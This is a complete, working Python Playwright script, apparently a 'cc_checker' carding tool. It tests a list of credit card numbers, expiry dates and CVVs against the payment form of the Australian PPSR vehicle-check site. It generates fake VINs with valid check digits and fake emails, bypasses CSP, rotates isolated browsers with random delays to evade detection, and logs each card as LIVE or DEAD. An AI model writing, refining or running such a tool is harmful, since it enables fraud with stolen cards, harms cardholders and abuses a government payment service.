# run.py - complete lattice: rotating VIN/email, isolated browsers, padded expiry vectors
# one vector per card, clean terminal lines, results appended live

import asyncio
import random
import string
import re
from pathlib import Path

from playwright.async_api import async_playwright


# ─── Selectors ─────────────────────────────────────────────────────────────

VIN_SELECTOR    = '#ctl00_ctl00_pageContent_qmvsPageContent_ucCriteria_txtVIN'
EMAIL_CRITERIA  = '#ctl00_ctl00_pageContent_qmvsPageContent_ucCriteria_txtEmail'
PROCEED_BTN     = '#ctl00_ctl00_pageContent_qmvsPageContent_ucCriteria_btnProceed'

CARD_NUMBER     = '#ctl00_ctl00_pageContent_qmvsPageContent_ucPayment_ucCreditCard_txtCreditCardNumber'
EXP_MONTH       = '#ctl00_ctl00_pageContent_qmvsPageContent_ucPayment_ucCreditCard_txtExpiryMonth'
EXP_YEAR        = '#ctl00_ctl00_pageContent_qmvsPageContent_ucPayment_ucCreditCard_txtExpiryYear'
CSC             = '#ctl00_ctl00_pageContent_qmvsPageContent_ucPayment_ucCreditCard_txtCsc'
PAY_NOW         = '#btnPayNow'


# ─── Fresh VIN ─────────────────────────────────────────────────────────────

def fresh_vin():
    wmi = '6' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=2))
    vds = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    year = random.choice('RSTVWXY123456789')
    plant = random.choice(string.ascii_uppercase + string.digits)
    vis = ''.join(random.choices(string.digits, k=6))
    base = wmi + vds + '0' + year + plant + vis

    translit = {c: ord(c)-55 if c.isalpha() else int(c) for c in '0123456789ABCDEFGHJKLMNPRSTUVWXYZ'}
    translit.update({'J':1,'K':2,'L':3,'M':4,'N':5,'P':7,'R':9,'S':2,'T':3,'U':4,'V':5,'W':6,'X':7,'Y':8,'Z':9})
    weights = [8,7,6,5,4,3,2,10,0,9,8,7,6,5,4,3,2]
    total = sum(translit.get(c.upper(), 0) * w for c, w in zip(base, weights))
    rem = total % 11
    check = 'X' if rem == 10 else str(rem)
    return base[:8] + check + base[9:]


# ─── Fresh email ───────────────────────────────────────────────────────────

FIRST = ["andrew","jack","james","michael","david","sarah","emily","olivia","thomas","ben","lucy","grace"]
LAST  = ["jackson","duncan","wilson","thompson","martin","roberts","anderson","harper","lee","clarke","brown","evans"]

def fresh_email():
    return f"{random.choice(FIRST)}{random.choice(LAST)}{random.randint(1000,9999)}@{random.choice(['gmail.com','outlook.com'])}"


# ─── Load cards ────────────────────────────────────────────────────────────

def load_cards():
    path = Path("/Users/adminuser/vsc/cc_checker/cards.txt")
    if not path.exists():
        print(f"cards.txt not found: {path}")
        return []
    
    cards = []
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith('#'): continue
        parts = re.split(r'[\s;,|]+', line)
        parts = [p.strip().strip('"\'') for p in parts if p.strip()]
        if len(parts) >= 4:
            num = parts[0].replace(" ", "").replace("-", "")
            mon_raw = ''.join(c for c in parts[1] if c.isdigit())
            yr_raw = ''.join(c for c in parts[2] if c.isdigit())
            cvv = parts[3].strip()
            
            # Pad month to 2 digits (6 → 06, 12 → 12, 1 → 01)
            mon = mon_raw.zfill(2)
            
            # Pad year to 2 or 4 digits as needed (26 → 26, 2026 → 2026)
            if len(yr_raw) == 2:
                yr = yr_raw
            elif len(yr_raw) == 4:
                yr = yr_raw[-2:]  # site likely wants YY
            else:
                continue  # invalid
            
            if len(num) in (15,16,19) and len(cvv) in (3,4) and len(mon) == 2 and mon.isdigit() and yr.isdigit():
                cards.append({
                    "number": num,
                    "month": mon,
                    "year": yr,
                    "csc": cvv,
                    "raw": line
                })
    return cards


# ─── Status: error popup/text = DEAD, else LIVE ────────────────────────────

async def card_status(page):
    html = await page.content()
    text = html.lower()
    title = (await page.title()).lower()
    url = page.url.lower()

    if "error" in text or "an error has occurred" in text or "error" in title or "error" in url:
        return "❌ DEAD"

    error_selectors = [
        '.error', '.alert-danger', '#error', '.modal-error', '.popup-error', 
        '[role="alert"][class*="error"]', '.message-error', '.validation-errors'
    ]
    for sel in error_selectors:
        try:
            if await page.is_visible(sel, timeout=2000):
                return "❌ DEAD"
        except:
            pass

    return "✅ LIVE"


# ─── Single card attempt ───────────────────────────────────────────────────

async def try_card(card, index, total):
    vin = fresh_vin()
    email = fresh_email()
    raw = card["raw"]

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox"])
        context = await browser.new_context(ignore_https_errors=True, bypass_csp=True)
        page = await context.new_page()

        await page.goto("https://transact.ppsr.gov.au/ppsr-mobile/QMVS?wsi=bee198b3-a3e3-4396-9234-58c5dc51c1c4", 
                        wait_until="networkidle", timeout=45000)

        await page.wait_for_selector(VIN_SELECTOR, timeout=30000)
        await page.fill(VIN_SELECTOR, vin)

        try: await page.fill(EMAIL_CRITERIA, email, timeout=5000)
        except: pass

        await page.click(PROCEED_BTN, timeout=10000)
        await asyncio.sleep(2)

        # Card fields with frame fallback
        for sel, val in [
            (CARD_NUMBER, card["number"]),
            (EXP_MONTH, card["month"]),  # now 2-digit padded
            (EXP_YEAR, card["year"]),
            (CSC, card["csc"])
        ]:
            try:
                await page.fill(sel, val, timeout=5000)
            except:
                for frame in page.frames:
                    try:
                        await frame.fill(sel, val, timeout=4000)
                        break
                    except:
                        continue

        await asyncio.sleep(2)

        try:
            await page.click(PAY_NOW, timeout=12000)
        except:
            pass

        await asyncio.sleep(8)

        status = await card_status(page)

        result = f"{raw} → {status}"
        print(result)

        with open("ppsr_results.txt", "a", encoding="utf-8") as f:
            f.write(result + "\n")

        await browser.close()


# ─── Main ─────────────────────────────────────────────────────────────────

async def main():
    Path("ppsr_results.txt").write_text("")

    cards = load_cards()
    if not cards:
        print("No cards loaded.")
        return

    print(f"Processing {len(cards)} cards — one line per result\n")

    for i, card in enumerate(cards, 1):
        await try_card(card, i, len(cards))
        await asyncio.sleep(random.uniform(6, 15))

    print("\nComplete. Results in ppsr_results.txt")


if __name__ == "__main__":
    asyncio.run(main())